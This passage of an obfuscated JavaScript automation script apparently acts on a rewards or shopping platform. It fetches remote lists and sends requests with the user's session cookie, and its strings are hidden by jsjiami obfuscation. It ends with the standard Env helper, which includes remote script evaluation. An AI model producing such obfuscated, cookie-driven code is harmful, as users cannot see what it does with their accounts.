_0x2b8a42={'deXNj':function(_0x59590d){return _0x898c79[_0x5115('32','ztnf')](_0x59590d);}};if(_0x898c79[_0x5115('33','mz2y')](_0x898c79[_0x5115('34','T1e2')],_0x898c79[_0x5115('35','Lixa')])){_0x2b8a42[_0x5115('36','AdzE')](_0xa8b187);}else{try{if(_0x898c79[_0x5115('37','34bB')](_0x898c79[_0x5115('38','d)*)')],_0x898c79[_0x5115('39','cQts')])){if(_0x46e681){console[_0x5115('3a','$6dl')]($[_0x5115('3b','$6dl')]+_0x5115('3c','OK9C'));}else{_0x4270ed=JSON[_0x5115('3d','4g(c')](_0x4270ed);}}else{if(_0x46e681){if(_0x898c79[_0x5115('3e','AdzE')](_0x898c79[_0x5115('3f','4g(c')],_0x898c79[_0x5115('40','Hjvu')])){_0x2b8a42[_0x5115('41','BqpE')](_0xa8b187);}else{console[_0x5115('42','Rwm%')]($[_0x5115('43','Rwm%')]+_0x5115('44','mz2y'));}}else{_0x4270ed=JSON[_0x5115('45','CSfk')](_0x4270ed);}}}catch(_0x23563f){$[_0x5115('46','Y4zn')](_0x23563f,resp);}finally{if(_0x898c79[_0x5115('47','5r]M')](_0x898c79[_0x5115('48','mp@@')],_0x898c79[_0x5115('49','!z6T')])){_0x898c79[_0x5115('4a','kWSI')](_0xa8b187);}else{$[_0x5115('4b','byk#')](e,resp);}}}});});}function wuzhi02(_0x159ca0){var _0x39a7b6={'SBvpU':function(_0x3cdc9c,_0x1ac6fb){return _0x3cdc9c!==_0x1ac6fb;},'DJdFq':_0x5115('4c','OK9C'),'bfwkm':_0x5115('4d','Z%Qh'),'ICekB':function(_0x12edf8,_0x252890){return _0x12edf8===_0x252890;},'jpndZ':_0x5115('4e','@dz&'),'cSNGZ':_0x5115('4f','cQts'),'ultsw':_0x5115('50','Lixa'),'QZxya':function(_0x929c06){return _0x929c06();},'KADaf':function(_0x1fef1d,_0x413060){return _0x1fef1d===_0x413060;},'uVwPM':_0x5115('51','EnTL'),'ZFFBV':_0x5115('52','d)*)'),'FvwyH':_0x5115('53','T1e2'),'dFila':_0x5115('54','5tyk'),'lYphO':_0x5115('55','Lixa'),'CNmAA':_0x5115('56','YolQ'),'mkhHN':_0x5115('57','*G@Q'),'GErwL':function(_0x3b4aab,_0x50c924){return _0x3b4aab(_0x50c924);},'Cyoai':_0x5115('58','Rwm%'),'toKmZ':_0x5115('c','R[UZ'),'tGwzX':_0x5115('59',']9@j'),'ZPYBw':function(_0x3fde82,_0x1b482d){return _0x3fde82(_0x1b482d);}};return new Promise(_0xa6f67=>{var _0x53295a={'bMtnU':function(_0x306348,_0x1dd656){return _0x39a7b6[_0x5115('5a','Y4zn')](_0x306348,_0x1dd656);},'MOKoU':_0x39a7b6[_0x5115('5b','(rbN')],'fndLd':_0x39a7b6[_0x5115('5c','n3r8')],'xjgRk':function(_0x262190,_0xb3e531){return _0x39a7b6[_0x5115('5d','mp@@')](_0x262190,_0xb3e531);},'AdyaN':_0x39a7b6[_0x5115('5e','$6dl')],'REAEQ':_0x39a7b6[_0x5115('5f','vmZ&')],'tmfdR':_0x39a7b6[_0x5115('60','jWD&')],'huEif':function(_0x488172){return _0x39a7b6[_0x5115('61','lq!A')](_0x488172);}};if(_0x39a7b6[_0x5115('62','Y4zn')](_0x39a7b6[_0x5115('63',')7ac')],_0x39a7b6[_0x5115('64','T1e2')])){$[_0x5115('65','d)*)')](e,resp);}else{let _0x56d524=+new Date();let _0x77d906=_0x159ca0[_0x5115('66','dY^4')];let _0x49566c={'url':_0x5115('67','5tyk')+ +new Date(),'headers':{'Host':_0x39a7b6[_0x5115('68','mp@@')],'accept':_0x39a7b6[_0x5115('69','*G@Q')],'content-type':_0x39a7b6[_0x5115('6a','g%zL')],'origin':_0x39a7b6[_0x5115('6b','5r]M')],'accept-language':_0x39a7b6[_0x5115('6c','&eEu')],'user-agent':$[_0x5115('6d','ALvg')]()?process[_0x5115('6e','byk#')][_0x5115('6f','T]!N')]?process[_0x5115('70','kWSI')][_0x5115('71','$6dl')]:_0x39a7b6[_0x5115('72','CSfk')](require,_0x39a7b6[_0x5115('73','V(L!')])[_0x5115('74','V(L!')]:$[_0x5115('75','byi4')](_0x39a7b6[_0x5115('76','L[MP')])?$[_0x5115('77','5r]M')](_0x39a7b6[_0x5115('78','d)*)')]):_0x39a7b6[_0x5115('79','cQts')],'referer':_0x5115('7a','L[MP')+_0x77d906,'Cookie':cookie},'body':_0x5115('7b','OK9C')+_0x39a7b6[_0x5115('7c','T1e2')](escape,_0x77d906)+_0x5115('7d','lq!A')+_0x56d524};$[_0x5115('7e','OK9C')](_0x49566c,(_0x2dd231,_0x17813b,_0x58c327)=>{if(_0x53295a[_0x5115('7f','mp@@')](_0x53295a[_0x5115('80','Q2YS')],_0x53295a[_0x5115('81','$6dl')])){try{if(_0x2dd231){if(_0x53295a[_0x5115('82','vmZ&')](_0x53295a[_0x5115('83','ztnf')],_0x53295a[_0x5115('84','Uz5T')])){_0x58c327=JSON[_0x5115('85',']9@j')](_0x58c327);}else{console[_0x5115('86','ztnf')]($[_0x5115('87','T]!N')]+_0x5115('88','YolQ'));}}else{if(_0x53295a[_0x5115('89','vmZ&')](_0x53295a[_0x5115('8a','dY^4')],_0x53295a[_0x5115('8b','*G@Q')])){console[_0x5115('8c','BqpE')]($[_0x5115('8d','Hjvu')]+_0x5115('8e','Lixa'));}else{_0x58c327=JSON[_0x5115('8f','ztnf')](_0x58c327);}}}catch(_0x5cfbf7){$[_0x5115('90','Rwm%')](_0x5cfbf7,resp);}finally{_0x53295a[_0x5115('91','R[UZ')](_0xa6f67);}}else{console[_0x5115('92','mp@@')]($[_0x5115('93','L[MP')]+_0x5115('94','V(L!'));}});}});}function invite(){var _0x55f4bf={'kzOLH':function(_0x3f8570){return _0x3f8570();},'RbHgG':function(_0x3afbb6,_0x262380){return _0x3afbb6===_0x262380;},'UBmBD':_0x5115('95','4g(c'),'ydROE':_0x5115('96','Lixa'),'YVAzV':function(_0x530e1c,_0x3daf4f){return _0x530e1c!==_0x3daf4f;},'LerIM':_0x5115('97','dY^4'),'YWMFJ':function(_0x5ef778,_0x201816){return _0x5ef778!==_0x201816;},'wlWFp':function(_0x3bef3e,_0x182454){return _0x3bef3e<_0x182454;},'iHpQV':function(_0x49c483,_0x2bac51){return _0x49c483(_0x2bac51);},'xGiOn':_0x5115('98','Uz5T'),'IQyii':_0x5115('99','YolQ'),'Hzacr':_0x5115('9a','lq!A')};return new Promise(_0x42d03e=>{var _0x2d30a9={'JjtjV':function(_0xde3351){return _0x55f4bf[_0x5115('9b','YolQ')](_0xde3351);},'QpEOf':function(_0x523981,_0x14b87b){return _0x55f4bf[_0x5115('9c','CSfk')](_0x523981,_0x14b87b);},'HFDTS':_0x55f4bf[_0x5115('9d','EnTL')],'bMtEB':_0x55f4bf[_0x5115('9e','*G@Q')],'iKbGM':function(_0x2d01db,_0x16627a){return _0x55f4bf[_0x5115('9f','EnTL')](_0x2d01db,_0x16627a);},'mMIIA':_0x55f4bf[_0x5115('a0','AdzE')],'nqgLP':function(_0x1a88ae,_0x353a76){return _0x55f4bf[_0x5115('a1','!z6T')](_0x1a88ae,_0x353a76);},'jtFbM':function(_0x44bb99,_0xbc81ab){return _0x55f4bf[_0x5115('a2','OK9C')](_0x44bb99,_0xbc81ab);},'VBofB':function(_0x11b111,_0x5e264b){return _0x55f4bf[_0x5115('a3','mz2y')](_0x11b111,_0x5e264b);}};if(_0x55f4bf[_0x5115('a4','cQts')](_0x55f4bf[_0x5115('a5','YolQ')],_0x55f4bf[_0x5115('a6','lq!A')])){$[_0x5115('a7','kFJU')]({'url':_0x55f4bf[_0x5115('a8','mp@@')],'headers':{'User-Agent':_0x55f4bf[_0x5115('a9','zty7')]}},async(_0x8dc00e,_0x4063cd,_0x27364d)=>{try{if(_0x8dc00e){if(_0x2d30a9[_0x5115('aa','Uz5T')](_0x2d30a9[_0x5115('ab','@dz&')],_0x2d30a9[_0x5115('ac','Y4zn')])){_0x2d30a9[_0x5115('ad','lq!A')](_0x42d03e);}else{console[_0x5115('92','mp@@')]($[_0x5115('ae','ALvg')]+_0x5115('af','5r]M'));}}else{if(_0x2d30a9[_0x5115('b0','Z%Qh')](_0x2d30a9[_0x5115('b1',')7ac')],_0x2d30a9[_0x5115('b2','CSfk')])){console[_0x5115('b3','zty7')]($[_0x5115('b4','evtc')]+_0x5115('b5','9dNF'));}else{$[_0x5115('b6','kFJU')]=JSON[_0x5115('b7','byi4')](_0x27364d);if(_0x2d30a9[_0x5115('b8','mp@@')]($[_0x5115('b9','V(L!')][_0x5115('ba','cQts')],0x0)){for(let _0x4e3e1f=0x0;_0x2d30a9[_0x5115('bb','Lixa')](_0x4e3e1f,$[_0x5115('bc','Y4zn')][_0x5115('bd','T1e2')][_0x5115('be','Y4zn')]);_0x4e3e1f++){let _0x4c0ac8=$[_0x5115('bf','L[MP')][_0x5115('c0','T]!N')][_0x4e3e1f];await $[_0x5115('c1','mz2y')](0x1f4);await _0x2d30a9[_0x5115('c2','*G@Q')](wuzhi01,_0x4c0ac8);}await $[_0x5115('c3','EnTL')](0x1f4);await _0x2d30a9[_0x5115('c4','Q2YS')](shuye73);}}}}catch(_0x4d767e){$[_0x5115('c5','&eEu')](_0x4d767e,_0x4063cd);}finally{_0x2d30a9[_0x5115('c6','cQts')](_0x42d03e);}});}else{data=JSON[_0x5115('c7','@dz&')](data);}});}function shuye73(){var _0x203bde={'NXvds':function(_0x558979,_0x2665a7){return _0x558979===_0x2665a7;},'lLeqb':_0x5115('c8','byi4'),'ekLDB':_0x5115('c9','9dNF'),'coiAr':function(_0x52bb21,_0x1fca37){return _0x52bb21!==_0x1fca37;},'XFlOb':_0x5115('ca','!z6T'),'DxSKM':function(_0x4fb5f8,_0x39c847){return _0x4fb5f8<_0x39c847;},'owmep':function(_0x9689c8,_0x1a0a84){return _0x9689c8(_0x1a0a84);},'EBOqT':function(_0x28754a){return _0x28754a();},'EdHPb':_0x5115('cb','@dz&'),'QGebn':_0x5115('cc','n3r8')};return new Promise(_0x2f51eb=>{var _0x2ee6e2={'RSxjW':function(_0x55d7c1,_0x24e5be){return _0x203bde[_0x5115('cd','4g(c')](_0x55d7c1,_0x24e5be);},'hxzVF':_0x203bde[_0x5115('ce','kWSI')],'InQTn':_0x203bde[_0x5115('cf','YolQ')],'bkVQj':function(_0xab8906,_0x2d3a16){return _0x203bde[_0x5115('d0','Rwm%')](_0xab8906,_0x2d3a16);},'wuOHb':_0x203bde[_0x5115('d1','!z6T')],'WJFiI':function(_0x4187b8,_0x5cdb1e){return _0x203bde[_0x5115('d2','evtc')](_0x4187b8,_0x5cdb1e);},'xrwHD':function(_0x27499c,_0x2e69ef){return _0x203bde[_0x5115('d3','V(L!')](_0x27499c,_0x2e69ef);},'ziFvf':function(_0x2d26bb){return _0x203bde[_0x5115('d4','n3r8')](_0x2d26bb);}};$[_0x5115('d5','Q2YS')]({'url':_0x203bde[_0x5115('d6','T1e2')],'headers':{'User-Agent':_0x203bde[_0x5115('d7','Hjvu')]}},async(_0x427201,_0x2effa4,_0xc8fb70)=>{if(_0x2ee6e2[_0x5115('d8','Lixa')](_0x2ee6e2[_0x5115('d9','L[MP')],_0x2ee6e2[_0x5115('da','9dNF')])){$[_0x5115('db','Uz5T')](e,_0x2effa4);}else{try{if(_0x427201){console[_0x5115('dc',')7ac')]($[_0x5115('dd','4g(c')]+_0x5115('b5','9dNF'));}else{if(_0x2ee6e2[_0x5115('de','cQts')](_0x2ee6e2[_0x5115('df','g%zL')],_0x2ee6e2[_0x5115('e0','byk#')])){if(_0x427201){console[_0x5115('e1','T1e2')]($[_0x5115('e2','5r]M')]+_0x5115('e3','dY^4'));}else{_0xc8fb70=JSON[_0x5115('e4','T]!N')](_0xc8fb70);}}else{$[_0x5115('e5','byi4')]=JSON[_0x5115('e6','cQts')](_0xc8fb70);if(_0x2ee6e2[_0x5115('e7','YolQ')]($[_0x5115('e8','5r]M')][_0x5115('e9','n3r8')],0x0)){for(let _0xa9c3a0=0x0;_0x2ee6e2[_0x5115('ea','ztnf')](_0xa9c3a0,$[_0x5115('eb','5tyk')][_0x5115('ec','CSfk')][_0x5115('ed','BqpE')]);_0xa9c3a0++){let _0x371c7f=$[_0x5115('ee','(rbN')][_0x5115('ef','YolQ')][_0xa9c3a0];await $[_0x5115('c3','EnTL')](0x1f4);await _0x2ee6e2[_0x5115('f0','byi4')](wuzhi02,_0x371c7f);}}}}}catch(_0x1c238b){$[_0x5115('f1','(rbN')](_0x1c238b,_0x2effa4);}finally{_0x2ee6e2[_0x5115('f2','byi4')](_0x2f51eb);}}});});};_0xodE='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}